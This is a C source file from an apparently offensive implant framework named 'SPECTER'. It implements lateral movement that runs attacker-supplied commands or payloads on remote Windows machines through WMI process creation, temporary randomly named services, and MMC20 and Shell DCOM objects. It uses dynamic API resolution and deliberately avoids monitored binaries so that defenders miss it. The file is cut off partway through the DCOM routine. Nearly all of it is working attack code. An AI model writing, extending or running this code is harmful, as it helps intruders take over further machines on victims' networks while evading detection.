/**
 * SPECTER Module — Lateral Movement
 *
 * Provides four lateral movement techniques using direct DCOM/RPC — no
 * PowerShell, wmic.exe, schtasks.exe, or other monitored binaries.
 *
 * Subcommands:
 *   "wmi"     <target> <command>                  — remote WMI Win32_Process.Create
 *   "scm"     <target> <payload_path>             — remote SCM service creation
 *   "dcom"    <target> <payload> <method>          — DCOM lateral (ShellBrowserWindow/MMC20/ShellWindows)
 *   "schtask" <target> <payload_path>             — ITaskService scheduled task
 *
 * All Windows API calls go through bus->resolve() — no direct imports.
 * COM interfaces are accessed via direct DCOM — no child process spawns.
 *
 * Build: make modules  (produces build/modules/lateral.bin)
 */

#include "module.h"

/* ------------------------------------------------------------------ */
/*  Inline CRT primitives (modules are standalone PIC blobs)           */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s)
{
    SIZE_T len = 0;
    while (s[len]) len++;
    return len;
}

int spec_strcmp(const char *a, const char *b)
{
    while (*a && (*a == *b)) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

void *spec_memset(void *dst, int c, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = (BYTE)c;
    return dst;
}

void *spec_memcpy(void *dst, const void *src, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
    return dst;
}

/* ------------------------------------------------------------------ */
/*  COM / DCOM constants                                               */
/* ------------------------------------------------------------------ */

/* HRESULT codes */
typedef LONG HRESULT;
#define S_OK                    ((HRESULT)0x00000000)
#define S_FALSE                 ((HRESULT)0x00000001)
#define FAILED(hr)              ((HRESULT)(hr) < 0)
#define SUCCEEDED(hr)           ((HRESULT)(hr) >= 0)

/* COM init flags */
#define COINIT_MULTITHREADED    0x0

/* COM CLSCTX */
#define CLSCTX_LOCAL_SERVER     0x4
#define CLSCTX_REMOTE_SERVER    0x10
#define CLSCTX_INPROC_SERVER    0x1

/* VARIANT types */
#define VT_EMPTY    0
#define VT_NULL     1
#define VT_I4       3
#define VT_BSTR     8

/* DISPATCH flags */
#define DISPATCH_METHOD         0x1
#define DISPATCH_PROPERTYGET    0x2

/* Authentication level */
#define RPC_C_AUTHN_LEVEL_DEFAULT       0
#define RPC_C_AUTHN_LEVEL_CALL          3
#define RPC_C_IMP_LEVEL_IMPERSONATE     3
#define RPC_C_AUTHN_WINNT               10
#define RPC_C_AUTHZ_NONE                0
#define EOAC_NONE                       0

/* Service Control Manager constants */
#define SC_MANAGER_ALL_ACCESS           0x000F003F
#define SC_MANAGER_CONNECT              0x0001
#define SC_MANAGER_CREATE_SERVICE       0x0002
#define SERVICE_ALL_ACCESS              0x000F01FF
#define SERVICE_WIN32_OWN_PROCESS       0x00000010
#define SERVICE_DEMAND_START            0x00000003
#define SERVICE_ERROR_IGNORE            0x00000000
#define SERVICE_CONTROL_STOP            0x00000001
#define DELETE                          0x00010000

/* Service access flags for open/create */
#define SERVICE_START                   0x0010
#define SERVICE_STOP                    0x0020
#define SERVICE_QUERY_STATUS            0x0004

/* Output buffer size */
#define LATERAL_BUF_SIZE    512

/* Max random service name length */
#define SVC_NAME_LEN        12

/* ------------------------------------------------------------------ */
/*  COM GUID structure                                                 */
/* ------------------------------------------------------------------ */

typedef struct _GUID {
    DWORD Data1;
    WORD  Data2;
    WORD  Data3;
    BYTE  Data4[8];
} GUID, IID, CLSID;

/* IDispatch IID: {00020400-0000-0000-C000-000000000046} */
static const IID IID_IDispatch = {
    0x00020400, 0x0000, 0x0000,
    {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}
};

/* WbemScripting.SWbemLocator CLSID: {76A64158-CB41-11D1-8B02-00600806D9B6} */
static const CLSID CLSID_SWbemLocator = {
    0x76A64158, 0xCB41, 0x11D1,
    {0x8B, 0x02, 0x00, 0x60, 0x08, 0x06, 0xD9, 0xB6}
};

/* MMC20.Application CLSID: {49B2791A-B1AE-4C90-9B8E-E860BA07F889} */
static const CLSID CLSID_MMC20Application = {
    0x49B2791A, 0xB1AE, 0x4C90,
    {0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89}
};

/* ShellBrowserWindow CLSID: {C08AFD90-F2A1-11D1-8455-00A0C91F3880} */
static const CLSID CLSID_ShellBrowserWindow = {
    0xC08AFD90, 0xF2A1, 0x11D1,
    {0x84, 0x55, 0x00, 0xA0, 0xC9, 0x1F, 0x38, 0x80}
};

/* ShellWindows CLSID: {9BA05972-F6A8-11CF-A442-00A0C90A8F39} */
static const CLSID CLSID_ShellWindows = {
    0x9BA05972, 0xF6A8, 0x11CF,
    {0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39}
};

/* Task Scheduler CLSID: {0F87369F-A4E5-4CFC-BD3E-73E6154572DD} */
static const CLSID CLSID_TaskScheduler = {
    0x0F87369F, 0xA4E5, 0x4CFC,
    {0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD}
};


/* ------------------------------------------------------------------ */
/*  COM interface structures (minimal vtable definitions)              */
/* ------------------------------------------------------------------ */

/* Forward declarations for COM interfaces */
typedef struct IUnknown IUnknown;
typedef struct IDispatch IDispatch;

/* IUnknown vtable */
typedef struct IUnknownVtbl {
    HRESULT (*QueryInterface)(IUnknown *This, const IID *riid, void **ppvObject);
    ULONG   (*AddRef)(IUnknown *This);
    ULONG   (*Release)(IUnknown *This);
} IUnknownVtbl;

struct IUnknown {
    IUnknownVtbl *lpVtbl;
};

/* BSTR is a WCHAR* with length prefix at [-1] (4 bytes before pointer) */
typedef WCHAR *BSTR;

/* VARIANT structure (simplified) */
typedef struct _VARIANT {
    WORD  vt;           /* VT_* type */
    WORD  wReserved1;
    WORD  wReserved2;
    WORD  wReserved3;
    union {
        LONG    lVal;       /* VT_I4 */
        BSTR    bstrVal;    /* VT_BSTR */
        PVOID   pVal;       /* generic pointer */
        QWORD   pad;        /* ensure 8-byte union size */
    };
} VARIANT;

/* DISPPARAMS structure */
typedef struct _DISPPARAMS {
    VARIANT *rgvarg;
    LONG    *rgdispidNamedArgs;
    DWORD    cArgs;
    DWORD    cNamedArgs;
} DISPPARAMS;

/* EXCEPINFO structure (simplified) */
typedef struct _EXCEPINFO {
    WORD    wCode;
    WORD    wReserved;
    BSTR    bstrSource;
    BSTR    bstrDescription;
    BSTR    bstrHelpFile;
    DWORD   dwHelpContext;
    PVOID   pvReserved;
    PVOID   pfnDeferredFillIn;
    HRESULT scode;
} EXCEPINFO;

/* IDispatch vtable */
typedef struct IDispatchVtbl {
    /* IUnknown */
    HRESULT (*QueryInterface)(IDispatch *This, const IID *riid, void **ppvObject);
    ULONG   (*AddRef)(IDispatch *This);
    ULONG   (*Release)(IDispatch *This);
    /* IDispatch */
    HRESULT (*GetTypeInfoCount)(IDispatch *This, DWORD *pctinfo);
    HRESULT (*GetTypeInfo)(IDispatch *This, DWORD iTInfo, DWORD lcid, PVOID *ppTInfo);
    HRESULT (*GetIDsOfNames)(IDispatch *This, const IID *riid,
                              PWCHAR *rgszNames, DWORD cNames, DWORD lcid,
                              LONG *rgDispId);
    HRESULT (*Invoke)(IDispatch *This, LONG dispIdMember, const IID *riid,
                       DWORD lcid, WORD wFlags, DISPPARAMS *pDispParams,
                       VARIANT *pVarResult, EXCEPINFO *pExcepInfo, DWORD *puArgErr);
} IDispatchVtbl;

struct IDispatch {
    IDispatchVtbl *lpVtbl;
};

/* COSERVERINFO for remote COM activation */
typedef struct _COAUTHIDENTITY {
    PWCHAR User;
    DWORD  UserLength;
    PWCHAR Domain;
    DWORD  DomainLength;
    PWCHAR Password;
    DWORD  PasswordLength;
    DWORD  Flags;
} COAUTHIDENTITY;

typedef struct _COAUTHINFO {
    DWORD   dwAuthnSvc;
    DWORD   dwAuthzSvc;
    PWCHAR  pwszServerPrincName;
    DWORD   dwAuthnLevel;
    DWORD   dwImpersonationLevel;
    COAUTHIDENTITY *pAuthIdentityData;
    DWORD   dwCapabilities;
} COAUTHINFO;

typedef struct _COSERVERINFO {
    DWORD       dwReserved1;
    PWCHAR      pwszName;
    COAUTHINFO *pAuthInfo;
    DWORD       dwReserved2;
} COSERVERINFO;

/* MULTI_QI for CoCreateInstanceEx */
typedef struct _MULTI_QI {
    const IID *pIID;
    IUnknown  *pItf;
    HRESULT    hr;
} MULTI_QI;

/* SERVICE_STATUS structure */
typedef struct _SERVICE_STATUS {
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
} SERVICE_STATUS;

/* ------------------------------------------------------------------ */
/*  Function pointer typedefs for resolved APIs                        */
/* ------------------------------------------------------------------ */

typedef HRESULT (*FN_CoInitializeEx)(PVOID pvReserved, DWORD dwCoInit);
typedef void    (*FN_CoUninitialize)(void);
typedef HRESULT (*FN_CoCreateInstanceEx)(const CLSID *rclsid, IUnknown *punkOuter,
                                          DWORD dwClsCtx, COSERVERINFO *pServerInfo,
                                          DWORD dwCount, MULTI_QI *pResults);
typedef HRESULT (*FN_CoCreateInstance)(const CLSID *rclsid, IUnknown *punkOuter,
                                        DWORD dwClsCtx, const IID *riid,
                                        void **ppv);
typedef HRESULT (*FN_CoSetProxyBlanket)(IUnknown *pProxy, DWORD dwAuthnSvc,
                                         DWORD dwAuthzSvc, PWCHAR pServerPrincName,
                                         DWORD dwAuthnLevel, DWORD dwImpLevel,
                                         PVOID pAuthInfo, DWORD dwCapabilities);
typedef BSTR    (*FN_SysAllocString)(const WCHAR *psz);
typedef void    (*FN_SysFreeString)(BSTR bstrString);

typedef HANDLE  (*FN_OpenSCManagerW)(const WCHAR *lpMachineName,
                                      const WCHAR *lpDatabaseName,
                                      DWORD dwDesiredAccess);
typedef HANDLE  (*FN_CreateServiceW)(HANDLE hSCManager, const WCHAR *lpServiceName,
                                      const WCHAR *lpDisplayName, DWORD dwDesiredAccess,
                                      DWORD dwServiceType, DWORD dwStartType,
                                      DWORD dwErrorControl, const WCHAR *lpBinaryPathName,
                                      const WCHAR *lpLoadOrderGroup, PDWORD lpdwTagId,
                                      const WCHAR *lpDependencies, const WCHAR *lpServiceStartName,
                                      const WCHAR *lpPassword);
typedef BOOL    (*FN_StartServiceW)(HANDLE hService, DWORD dwNumServiceArgs,
                                     const WCHAR **lpServiceArgVectors);
typedef BOOL    (*FN_DeleteService)(HANDLE hService);
typedef BOOL    (*FN_CloseServiceHandle)(HANDLE hSCObject);
typedef BOOL    (*FN_ControlService)(HANDLE hService, DWORD dwControl,
                                      SERVICE_STATUS *lpServiceStatus);

typedef DWORD   (*FN_GetTickCount)(void);

/* ------------------------------------------------------------------ */
/*  Helper: append string to output buffer                             */
/* ------------------------------------------------------------------ */

static DWORD buf_append(char *buf, DWORD buf_len, DWORD offset,
                         const char *str)
{
    while (*str && offset < buf_len - 1)
        buf[offset++] = *str++;
    buf[offset] = '\0';
    return offset;
}

/* ------------------------------------------------------------------ */
/*  Helper: narrow ASCII string to wide WCHAR (in-place buffer)        */
/* ------------------------------------------------------------------ */

static DWORD narrow_to_wide(const char *src, WCHAR *dst, DWORD dst_chars)
{
    DWORD i;
    for (i = 0; src[i] && i < dst_chars - 1; i++)
        dst[i] = (WCHAR)(unsigned char)src[i];
    dst[i] = 0;
    return i;
}

/* ------------------------------------------------------------------ */
/*  Helper: generate pseudo-random service name                        */
/* ------------------------------------------------------------------ */

static void gen_svc_name(MODULE_BUS_API *api, WCHAR *name, DWORD len)
{
    FN_GetTickCount pGetTickCount;
    DWORD seed, i;

    pGetTickCount = (FN_GetTickCount)api->resolve("kernel32.dll", "GetTickCount");
    seed = pGetTickCount ? pGetTickCount() : 0x41414141;

    for (i = 0; i < len - 1; i++) {
        seed = seed * 1103515245 + 12345;
        name[i] = (WCHAR)('A' + ((seed >> 16) % 26));
    }
    name[len - 1] = 0;
}

/* ------------------------------------------------------------------ */
/*  Helper: resolve COM APIs from ole32.dll and oleaut32.dll           */
/* ------------------------------------------------------------------ */

typedef struct _COM_APIS {
    FN_CoInitializeEx       pCoInitializeEx;
    FN_CoUninitialize       pCoUninitialize;
    FN_CoCreateInstanceEx   pCoCreateInstanceEx;
    FN_CoCreateInstance     pCoCreateInstance;
    FN_CoSetProxyBlanket    pCoSetProxyBlanket;
    FN_SysAllocString       pSysAllocString;
    FN_SysFreeString        pSysFreeString;
} COM_APIS;

static BOOL resolve_com_apis(MODULE_BUS_API *api, COM_APIS *com)
{
    spec_memset(com, 0, sizeof(COM_APIS));

    com->pCoInitializeEx = (FN_CoInitializeEx)
        api->resolve("ole32.dll", "CoInitializeEx");
    com->pCoUninitialize = (FN_CoUninitialize)
        api->resolve("ole32.dll", "CoUninitialize");
    com->pCoCreateInstanceEx = (FN_CoCreateInstanceEx)
        api->resolve("ole32.dll", "CoCreateInstanceEx");
    com->pCoCreateInstance = (FN_CoCreateInstance)
        api->resolve("ole32.dll", "CoCreateInstance");
    com->pCoSetProxyBlanket = (FN_CoSetProxyBlanket)
        api->resolve("ole32.dll", "CoSetProxyBlanket");
    com->pSysAllocString = (FN_SysAllocString)
        api->resolve("oleaut32.dll", "SysAllocString");
    com->pSysFreeString = (FN_SysFreeString)
        api->resolve("oleaut32.dll", "SysFreeString");

    if (!com->pCoInitializeEx || !com->pCoUninitialize ||
        !com->pCoCreateInstanceEx || !com->pSysAllocString ||
        !com->pSysFreeString)
        return FALSE;

    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Helper: BSTR from narrow string                                    */
/* ------------------------------------------------------------------ */

static BSTR bstr_from_narrow(COM_APIS *com, const char *str)
{
    WCHAR wbuf[512];
    narrow_to_wide(str, wbuf, 512);
    return com->pSysAllocString(wbuf);
}

/* ------------------------------------------------------------------ */
/*  Subcommand: wmi — WMI Win32_Process.Create via direct DCOM         */
/*                                                                     */
/*  Flow: CoCreateInstanceEx(SWbemLocator, remote) → IDispatch         */
/*    → ConnectServer(\\target\root\cimv2) → Get("Win32_Process")     */
/*    → ExecMethod_("Create", command)                                 */
/* ------------------------------------------------------------------ */

static DWORD cmd_wmi(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    const char *target;
    const char *command;
    COM_APIS com;
    HRESULT hr;
    IDispatch *pLocator = NULL;
    IDispatch *pService = NULL;
    IDispatch *pProcess = NULL;
    BSTR bstrResource = NULL;
    BSTR bstrMethod = NULL;
    BSTR bstrCmdLine = NULL;
    BSTR bstrClassName = NULL;

    target  = module_arg_string(args, 1);
    command = module_arg_string(args, 2);

    if (!target || !command) {
        MODULE_OUTPUT_ERROR(api, "lateral wmi: usage: wmi <target> <command>");
        return MODULE_ERR_ARGS;
    }

    if (!resolve_com_apis(api, &com)) {
        MODULE_OUTPUT_ERROR(api, "lateral wmi: failed to resolve COM APIs");
        return MODULE_ERR_RESOLVE;
    }

    hr = com.pCoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != (HRESULT)0x80010106) { /* RPC_E_CHANGED_MODE */
        MODULE_OUTPUT_ERROR(api, "lateral wmi: CoInitializeEx failed");
        return MODULE_ERR_INTERNAL;
    }

    /* Build WMI resource path: \\target\root\cimv2 */
    {
        char resource[256];
        DWORD off = 0;
        off = buf_append(resource, sizeof(resource), off, "\\\\");
        off = buf_append(resource, sizeof(resource), off, target);
        off = buf_append(resource, sizeof(resource), off, "\\root\\cimv2");

        /* Create SWbemLocator on remote target via CoCreateInstanceEx */
        {
            COSERVERINFO server_info;
            MULTI_QI mqi;
            WCHAR wtarget[256];

            spec_memset(&server_info, 0, sizeof(server_info));
            narrow_to_wide(target, wtarget, 256);
            server_info.pwszName = wtarget;

            spec_memset(&mqi, 0, sizeof(mqi));
            mqi.pIID = &IID_IDispatch;

            hr = com.pCoCreateInstanceEx(&CLSID_SWbemLocator, NULL,
                                          CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
                                          &server_info, 1, &mqi);
            if (FAILED(hr) || FAILED(mqi.hr)) {
                MODULE_OUTPUT_ERROR(api, "lateral wmi: CoCreateInstanceEx(SWbemLocator) failed");
                com.pCoUninitialize();
                return MODULE_ERR_ACCESS;
            }
            pLocator = (IDispatch *)mqi.pItf;
        }

        /* Set proxy blanket for authentication */
        if (com.pCoSetProxyBlanket) {
            com.pCoSetProxyBlanket((IUnknown *)pLocator,
                                   RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                   RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                                   NULL, EOAC_NONE);
        }

        /* Call ConnectServer via IDispatch::Invoke */
        bstrResource = bstr_from_narrow(&com, resource);
        {
            LONG dispid = 0;
            WCHAR method_name[] = {'C','o','n','n','e','c','t','S','e','r','v','e','r',0};
            PWCHAR names[] = { method_name };
            VARIANT varg;
            DISPPARAMS dp;
            VARIANT vresult;
            IID iid_null = {0,0,0,{0,0,0,0,0,0,0,0}};

            hr = pLocator->lpVtbl->GetIDsOfNames(pLocator, &iid_null,
                                                   names, 1, 0, &dispid);
            if (FAILED(hr)) {
                MODULE_OUTPUT_ERROR(api, "lateral wmi: GetIDsOfNames(ConnectServer) failed");
                goto wmi_cleanup;
            }

            spec_memset(&varg, 0, sizeof(varg));
            varg.vt = VT_BSTR;
            varg.bstrVal = bstrResource;

            spec_memset(&dp, 0, sizeof(dp));
            dp.rgvarg = &varg;
            dp.cArgs = 1;

            spec_memset(&vresult, 0, sizeof(vresult));

            hr = pLocator->lpVtbl->Invoke(pLocator, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, &vresult,
                                            NULL, NULL);
            if (FAILED(hr) || !vresult.pVal) {
                MODULE_OUTPUT_ERROR(api, "lateral wmi: ConnectServer failed");
                goto wmi_cleanup;
            }
            pService = (IDispatch *)vresult.pVal;
        }

        /* Get Win32_Process class via service.Get("Win32_Process") */
        bstrClassName = bstr_from_narrow(&com, "Win32_Process");
        {
            LONG dispid = 0;
            WCHAR method_name[] = {'G','e','t',0};
            PWCHAR names[] = { method_name };
            VARIANT varg;
            DISPPARAMS dp;
            VARIANT vresult;
            IID iid_null = {0,0,0,{0,0,0,0,0,0,0,0}};

            hr = pService->lpVtbl->GetIDsOfNames(pService, &iid_null,
                                                   names, 1, 0, &dispid);
            if (FAILED(hr)) {
                MODULE_OUTPUT_ERROR(api, "lateral wmi: GetIDsOfNames(Get) failed");
                goto wmi_cleanup;
            }

            spec_memset(&varg, 0, sizeof(varg));
            varg.vt = VT_BSTR;
            varg.bstrVal = bstrClassName;

            spec_memset(&dp, 0, sizeof(dp));
            dp.rgvarg = &varg;
            dp.cArgs = 1;

            spec_memset(&vresult, 0, sizeof(vresult));

            hr = pService->lpVtbl->Invoke(pService, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, &vresult,
                                            NULL, NULL);
            if (FAILED(hr) || !vresult.pVal) {
                MODULE_OUTPUT_ERROR(api, "lateral wmi: Get(Win32_Process) failed");
                goto wmi_cleanup;
            }
            pProcess = (IDispatch *)vresult.pVal;
        }

        /* Call Win32_Process.Create(CommandLine) via ExecMethod_ style Invoke */
        bstrCmdLine = bstr_from_narrow(&com, command);
        {
            LONG dispid = 0;
            WCHAR method_name[] = {'C','r','e','a','t','e',0};
            PWCHAR names[] = { method_name };
            VARIANT varg;
            DISPPARAMS dp;
            VARIANT vresult;
            IID iid_null = {0,0,0,{0,0,0,0,0,0,0,0}};

            hr = pProcess->lpVtbl->GetIDsOfNames(pProcess, &iid_null,
                                                    names, 1, 0, &dispid);
            if (FAILED(hr)) {
                MODULE_OUTPUT_ERROR(api, "lateral wmi: GetIDsOfNames(Create) failed");
                goto wmi_cleanup;
            }

            spec_memset(&varg, 0, sizeof(varg));
            varg.vt = VT_BSTR;
            varg.bstrVal = bstrCmdLine;

            spec_memset(&dp, 0, sizeof(dp));
            dp.rgvarg = &varg;
            dp.cArgs = 1;

            spec_memset(&vresult, 0, sizeof(vresult));

            hr = pProcess->lpVtbl->Invoke(pProcess, dispid, &iid_null, 0,
                                            DISPATCH_METHOD, &dp, &vresult,
                                            NULL, NULL);
            if (FAILED(hr)) {
                MODULE_OUTPUT_ERROR(api, "lateral wmi: Win32_Process.Create failed");
                goto wmi_cleanup;
            }
        }
    }

    {
        char out[LATERAL_BUF_SIZE];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "lateral wmi: executed on ");
        off = buf_append(out, sizeof(out), off, target);
        off = buf_append(out, sizeof(out), off, " -> ");
        off = buf_append(out, sizeof(out), off, command);
        MODULE_OUTPUT_TEXT(api, out);
    }

wmi_cleanup:
    if (bstrCmdLine)    com.pSysFreeString(bstrCmdLine);
    if (bstrClassName)  com.pSysFreeString(bstrClassName);
    if (bstrResource)   com.pSysFreeString(bstrResource);
    if (bstrMethod)     com.pSysFreeString(bstrMethod);
    if (pProcess)       pProcess->lpVtbl->Release(pProcess);
    if (pService)       pService->lpVtbl->Release(pService);
    if (pLocator)       pLocator->lpVtbl->Release(pLocator);
    com.pCoUninitialize();

    return FAILED(hr) ? MODULE_ERR_IO : MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: scm — remote service creation via SCM                  */
/*                                                                     */
/*  Flow: OpenSCManagerW(target) → CreateServiceW(random name)         */
/*    → StartServiceW → DeleteService (immediate cleanup)              */
/* ------------------------------------------------------------------ */

static DWORD cmd_scm(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    const char *target;
    const char *payload_path;
    FN_OpenSCManagerW   pOpenSCManagerW;
    FN_CreateServiceW   pCreateServiceW;
    FN_StartServiceW    pStartServiceW;
    FN_DeleteService    pDeleteService;
    FN_CloseServiceHandle pCloseServiceHandle;
    HANDLE hSCManager = NULL;
    HANDLE hService = NULL;
    WCHAR wtarget[256];
    WCHAR wpayload[512];
    WCHAR svc_name[SVC_NAME_LEN + 1];

    target       = module_arg_string(args, 1);
    payload_path = module_arg_string(args, 2);

    if (!target || !payload_path) {
        MODULE_OUTPUT_ERROR(api, "lateral scm: usage: scm <target> <payload_path>");
        return MODULE_ERR_ARGS;
    }

    /* Resolve SCM APIs from advapi32.dll */
    pOpenSCManagerW = (FN_OpenSCManagerW)
        api->resolve("advapi32.dll", "OpenSCManagerW");
    pCreateServiceW = (FN_CreateServiceW)
        api->resolve("advapi32.dll", "CreateServiceW");
    pStartServiceW = (FN_StartServiceW)
        api->resolve("advapi32.dll", "StartServiceW");
    pDeleteService = (FN_DeleteService)
        api->resolve("advapi32.dll", "DeleteService");
    pCloseServiceHandle = (FN_CloseServiceHandle)
        api->resolve("advapi32.dll", "CloseServiceHandle");

    if (!pOpenSCManagerW || !pCreateServiceW || !pStartServiceW ||
        !pDeleteService || !pCloseServiceHandle) {
        MODULE_OUTPUT_ERROR(api, "lateral scm: failed to resolve SCM APIs");
        return MODULE_ERR_RESOLVE;
    }

    /* Convert strings to wide */
    narrow_to_wide(target, wtarget, 256);
    narrow_to_wide(payload_path, wpayload, 512);

    /* Generate random service name */
    gen_svc_name(api, svc_name, SVC_NAME_LEN + 1);

    /* Open remote SCM */
    hSCManager = pOpenSCManagerW(wtarget, NULL,
                                  SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        MODULE_OUTPUT_ERROR(api, "lateral scm: OpenSCManagerW failed");
        return MODULE_ERR_ACCESS;
    }

    /* Create service with random name */
    hService = pCreateServiceW(hSCManager, svc_name, svc_name,
                                SERVICE_ALL_ACCESS,
                                SERVICE_WIN32_OWN_PROCESS,
                                SERVICE_DEMAND_START,
                                SERVICE_ERROR_IGNORE,
                                wpayload,
                                NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        MODULE_OUTPUT_ERROR(api, "lateral scm: CreateServiceW failed");
        pCloseServiceHandle(hSCManager);
        return MODULE_ERR_ACCESS;
    }

    /* Start the service (may fail if binary isn't a real service — that's OK,
       the binary still executes briefly before SCM kills it) */
    pStartServiceW(hService, 0, NULL);

    /* Delete service immediately for cleanup */
    pDeleteService(hService);

    pCloseServiceHandle(hService);
    pCloseServiceHandle(hSCManager);

    {
        char out[LATERAL_BUF_SIZE];
        DWORD off = 0;
        off = buf_append(out, sizeof(out), off, "lateral scm: service created+started on ");
        off = buf_append(out, sizeof(out), off, target);
        off = buf_append(out, sizeof(out), off, " -> ");
        off = buf_append(out, sizeof(out), off, payload_path);
        MODULE_OUTPUT_TEXT(api, out);
    }

    return MODULE_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: dcom — lateral movement via DCOM objects               */
/*                                                                     */
/*  Methods:                                                           */
/*    "mmc"    — MMC20.Application → Document.ActiveView.ExecuteShellCommand */
/*    "shell"  — ShellBrowserWindow → Document.Application.ShellExecute */
/*    "windows"— ShellWindows → Item().Document.Application.ShellExecute */
/*                                                                     */
/*  All use CoCreateInstanceEx for remote activation.                  */
/* ------------------------------------------------------------------ */

static DWORD cmd_dcom(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    const char *target;
    const char *payload;
    const char *method;
    COM_APIS com;
    HRESULT hr;
    IDispatch *pDisp = NULL;
    const CLSID *clsid;
    COSERVERINFO server_info;
    MULTI_QI mqi;
    WCHAR wtarget[256];

    target  = module_arg_string(args, 1);
    payload = module_arg_string(args, 2);
    method  = module_arg_string(args, 3);

    if (!target || !payload || !method) {
        MODULE_OUTPUT_ERROR(api, "lateral dcom: usage: dcom <target> <payload> <method>");
        return MODULE_ERR_ARGS;
    }

    if (!resolve_com_apis(api, &com)) {
        MODULE_OUTPUT_ERROR(api, "lateral dcom: failed to resolve COM APIs");
        return MODULE_ERR_RESOLVE;
    }

    hr = com.pCoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != (HRESULT)0x80010106) {
        MODULE_OUTPUT_ERROR(api, "lateral dcom: CoInitializeEx failed");
        return MODULE_ERR_INTERNAL;
    }

    /* Select CLSID based on method */
    if (spec_strcmp(method, "mmc") == 0) {
        clsid = &CLSID_MMC20Application;
    } else if (spec_strcmp(method, "shell") == 0) {
        clsid = &CLSID_ShellBrowserWindow;
    } else if (spec_strcmp(method, "windows") == 0) {
        clsid = &CLSID_ShellWindows;
    } else {
        MODULE_OUTPUT_ERROR(api, "lateral dcom: unknown method (mmc|shell|windows)");
        com.pCoUninitialize();
        return MODULE_ERR_ARGS;
    }

    /* Remote DCOM activation */
    spec_memset(&server_info, 0, sizeof(server_info));
    narrow_to_wide(target, wtarget, 256);
    server_info.pwszName = wtarget;

    spec_memset(&mqi, 0, sizeof(mqi));
    mqi.pIID = &IID_IDispatch;

    hr = com.pCoCreateInstanceEx(clsid, NULL,
                                  CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
                                  &server_info, 1, &mqi);
    if (FAILED(hr) || FAILED(mqi.hr)) {
        MODULE_OUTPUT_ERROR(api, "lateral dcom: CoCreateInstanceEx failed");
        com.pCoUninitialize();
        return MODULE_ERR_ACCESS;
    }
    pDisp = (IDispatch *)mqi.pItf;

    /* Set proxy blanket */
    if (com.pCoSetProxyBlanket) {
        com.pCoSetProxyBlanket((IUnknown *)pDisp,
                               RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                               RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                               NULL, EOAC_NONE);
    }

    /* Execute via the appropriate DCOM method chain */
    if (spec_strcmp(method, "mmc") == 0) {
        /* MMC20.Application → Document.ActiveView.ExecuteShellCommand(payload) */
        IDispatch *pDoc = NULL;
        IDispatch *pView = NULL;
        IID iid_null = {0,0,0,{0,0,0,0,0,0,0,0}};

        /* Get Document property */
        {
            LONG dispid = 0;
            WCHAR prop_name[] = {'D','o','c','u','m','e','n','t',0};
            PWCHAR names[] = { prop_name };
            DISPPARAMS dp = {NULL, NULL, 0, 0};
            VARIANT vresult;

            spec_memset(&vresult, 0, sizeof(vresult));
            hr = pDisp->lpVtbl->GetIDsOfNames(pDisp, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pDisp->lpVtbl->Invoke(pDisp, dispid, &iid_null, 0,
                                            DISPATCH_PROPERTYGET, &dp, &vresult,
                                            NULL, NULL);
                if (SUCCEEDED(hr)) pDoc = (IDispatch *)vresult.pVal;
            }
        }

        /* Get ActiveView property */
        if (pDoc) {
            LONG dispid = 0;
            WCHAR prop_name[] = {'A','c','t','i','v','e','V','i','e','w',0};
            PWCHAR names[] = { prop_name };
            DISPPARAMS dp = {NULL, NULL, 0, 0};
            VARIANT vresult;

            spec_memset(&vresult, 0, sizeof(vresult));
            hr = pDoc->lpVtbl->GetIDsOfNames(pDoc, &iid_null, names, 1, 0, &dispid);
            if (SUCCEEDED(hr)) {
                hr = pDoc->lpVtbl->Invoke(pDoc, dispid, &iid_null, 0,
                                            DISPATCH_PROPERTYGET, &dp, &vresult,
                                            NULL, NULL);
                if (SUCCEEDED(hr)) pView = (IDispatch *)vresult.pVal;
            }
        }

        /* Call ExecuteShellCommand(Command, Directory, Parameters, WindowState) */
        if (pView) {
            LONG dispid = 0;
            WCHAR mname[] = {'E','x','e','c','u','t','e','S','h','e','l','l',
                             'C','o','m','m','a','n','d',0};
            PWCHAR names[] = { mname };
            VARIANT vargs[4];
            DISPPARAMS dp;
            BSTR bstrPayload = bstr_from_narrow(&com, payload);
            BSTR bstrEmpty = bstr_from_narrow(&com, "");

            spec_memset(vargs, 0, sizeof(vargs));
            /* Args are in reverse order for IDispatch::Invoke */
            vargs[3].vt = VT_BSTR;
            vargs[3].bstrVal = bstrPayload;  /* Command */
            vargs[2].vt = VT_BSTR;
